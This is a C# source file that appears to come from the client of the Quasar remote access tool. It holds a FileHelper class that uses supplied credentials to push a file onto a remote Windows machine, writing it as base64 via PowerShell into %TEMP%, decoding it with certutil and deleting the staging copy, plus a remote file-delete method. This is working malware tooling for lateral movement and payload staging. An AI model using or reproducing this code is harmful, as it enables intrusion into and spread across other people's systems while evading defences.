using System;
using System.Net;
using System.Management;
using System.IO;

namespace Quasar.Client.Helper.Network
{
    public static class FileHelper
    {
        public static string SendFile(string localPath, IPAddress address, string username, string password, string remotePath = null)
        {
            if (!File.Exists(localPath))
                return ""; // Source file doesnt exist

            byte[] fileBytes = File.ReadAllBytes(localPath);
            string base64FileContents = Convert.ToBase64String(fileBytes);

            if (string.IsNullOrWhiteSpace(remotePath))
            {
                string extension = Path.GetExtension(localPath);
                string tempFileName = Guid.NewGuid().ToString("N") + extension;
                remotePath = "%TEMP%\\" + tempFileName;
            }

            string remoteB64Path = remotePath + ".b64";

            string psCommand = $"powershell.exe -Command \"Set-Content -Path '{remoteB64Path}' -Value '{base64FileContents}'\"";
            int retVal = CommandHelper.Execute(psCommand, username, password, address);
            if (retVal != 0)
                return ""; // Failed to write
            string decodeCommand = $"cmd.exe /c certutil -decode \"{remoteB64Path}\" \"{remotePath}\"";
            retVal = CommandHelper.Execute(decodeCommand, username, password, address);
            if (retVal != 0)
                return ""; // Failed to decode file
            string deleteCommand = $"cmd.exe /c del \"{remoteB64Path}\"";
            retVal = CommandHelper.Execute(deleteCommand, username, password, address);
            if (retVal != 0)
                return ""; // Failed to delete temporary base64 file
            return remotePath;
        }

        public static bool DeleteFile(string remotePath, IPAddress address, string username, string password)
        {
            string deleteCommand = $"cmd.exe /c del \"{remotePath}\"";
            int retVal = CommandHelper.Execute(deleteCommand, username, password, address);
            if (retVal != 0)
                return false;
            return true;
        }
    }
}
